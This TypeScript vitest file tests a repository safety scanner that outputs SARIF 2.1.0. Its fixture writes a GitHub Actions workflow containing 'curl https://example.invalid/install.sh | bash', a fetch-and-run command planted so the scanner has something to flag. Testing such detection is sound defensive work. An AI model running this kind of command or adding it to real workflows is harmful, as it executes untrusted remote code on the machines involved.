import { mkdir, writeFile } from "node:fs/promises";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";

import { formatRepositorySafetySarif, scanRepositorySafety } from "../src";
import { cleanupWorkspaceSandboxes, createWorkspaceSandbox } from "./helpers/workspaceSandbox";

async function writeRepoFile(rootPath: string, relativePath: string, content: string): Promise<void> {
  const targetPath = path.join(rootPath, relativePath);
  await mkdir(path.dirname(targetPath), { recursive: true });
  await writeFile(targetPath, content, "utf8");
}

afterEach(async () => {
  await cleanupWorkspaceSandboxes();
});

describe("repository SARIF", () => {
  it("maps repository findings into SARIF 2.1.0", async () => {
    const rootPath = await createWorkspaceSandbox("workspace-guard-sarif");
    await writeRepoFile(rootPath, ".github/workflows/release.yml", `name: release
on:
  workflow_dispatch:
jobs:
  ship:
    runs-on: ubuntu-latest
    steps:
      - run: curl https://example.invalid/install.sh | bash
`);

    const result = await scanRepositorySafety(rootPath);
    const sarif = JSON.parse(formatRepositorySafetySarif(result)) as {
      version: string;
      runs: Array<{
        tool: { driver: { rules: Array<{ id: string }> } };
        results: Array<{ ruleId: string; level: string; locations: Array<{ physicalLocation: { artifactLocation: { uri: string } } }> }>;
      }>;
    };

    expect(sarif.version).toBe("2.1.0");
    expect(sarif.runs[0]?.tool.driver.rules.length).toBeGreaterThan(0);
    expect(sarif.runs[0]?.results[0]?.locations[0]?.physicalLocation.artifactLocation.uri).toBe(".github/workflows/release.yml");
  });
});